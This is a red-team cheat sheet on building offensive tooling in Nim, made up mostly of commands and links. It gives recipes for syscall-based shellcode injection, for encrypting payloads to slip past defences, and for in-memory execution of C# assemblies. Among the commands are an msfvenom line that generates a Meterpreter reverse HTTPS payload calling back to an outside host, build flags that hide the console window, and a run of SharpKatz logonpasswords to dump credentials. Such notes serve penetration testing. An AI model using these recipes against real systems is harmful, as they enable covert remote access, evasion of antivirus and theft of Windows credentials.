# Nim

* [https://github.com/byt3bl33d3r/OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim)
* [https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/)
* [https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim](https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim)
* [https://github.com/ajpc500/NimExamples](https://github.com/ajpc500/NimExamples)
* [https://huskyhacks.dev/2021/07/17/nim-exploit-dev/](https://huskyhacks.dev/2021/07/17/nim-exploit-dev/)
* [https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/](https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/)




## Install

Windows:

* [https://nim-lang.org/install_windows.html](https://nim-lang.org/install_windows.html)
* [https://git-scm.com/download/win](https://git-scm.com/download/win)

Linux:

```
$ sudo apt install mingw-w64 -y
$ sudo apt install nim -y
Or
$ curl https://nim-lang.org/choosenim/init.sh -sSf | sh
```

Dependencies:

```
Nim > nimble install winim nimcrypto zippy
```




## Compilation

Basic:

```
Nim > nim c program.nim
```

To not popup the console window:

```
Nim > nim c --app:gui program.nim
```

For the best size:

```
Nim > nim c -d:danger -d:strip --opt:size --passC=-flto --passL=-flto program.nim
```

For Windows on Linux:

```
$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc program.nim
```

Add the needed relocation section to the resulting executable (from Windows):

```
Nim > nim c --passL:-Wl,--dynamicbase,--export-all-symbols program.nim
```




## Inject Shellcode



### NimlineWhispers

* [https://ajpc500.github.io/nim/Shellcode-Injection-using-Nim-and-Syscalls/](https://ajpc500.github.io/nim/Shellcode-Injection-using-Nim-and-Syscalls/)
* [https://github.com/ajpc500/NimlineWhispers](https://github.com/ajpc500/NimlineWhispers)
* [https://github.com/snovvcrash/NimlineWhispers](https://github.com/snovvcrash/NimlineWhispers)

How-to:

1. Generate a nim header with syscalls definitions (function names randomized): `python3 NimlineWhispers.py --randomise`.
2. Modify [*shellcode_bin.nim*](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim) template to fit new function names.
3. Generate a shellcode of your choice, put it into the template and compile the binary: `nim c -d=mingw --app=console --cpu=amd64 shellcode_bin.nim`.


#### Encrypted

* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_shellcode.nim](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_shellcode.nim)
* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_shellcode_loader_syscalls.nim](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_shellcode_loader_syscalls.nim)

```
 # Generate a shellcode
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.16.18 LPORT=443 -e x64/xor -b '\x00' -f csharp
 # Copy the shellcode into the 1st template and compile
$ nim c encrypt_shellcode.nim
 # Encrypt the shellcode and write contents into a file
$ ./encrypt_shellcode 'Passw0rd!' b64.txt
 # Copy encrypted shellcode into the 2nd template and compile
$ cat b64.txt | xclip -i -sel c
$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:danger -d:strip --opt:size --passC=-flto --passL=-flto encrypted_shellcode_loader_syscalls.nim
```




## Execute C# Assemblies

* [https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim)
* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/helpers/CSharpToNimByteArray.ps1](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/helpers/CSharpToNimByteArray.ps1)
* [https://github.com/snovvcrash/Creds/blob/master/helpers/CSharpToNimByteArray.ps1](https://github.com/snovvcrash/Creds/blob/master/helpers/CSharpToNimByteArray.ps1)

```
$ pwsh -exec bypass
PS > . ./CSharpToNimByteArray.ps1
PS > CSharpToNimByteArray -inputfile csharp.exe
Nim > nim c --passL:-Wl,--dynamicbase,--export-all-symbols execute_assembly_bin.nim
```



### Encrypted

* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_assembly.nim](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_assembly.nim)
* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_assembly_loader.nim](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_assembly_loader.nim)

```
$ nim c encrypt_assembly.nim
$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:danger -d:strip --opt:size --passC=-flto --passL=-flto encrypted_assembly_loader.nim
$ ./encrypt_assembly 'Passw0rd!' SharpKatz.exe b64.txt
Cmd > .\encrypted_assembly_loader.exe Passw0rd! b64.txt --Command logonpasswords
```
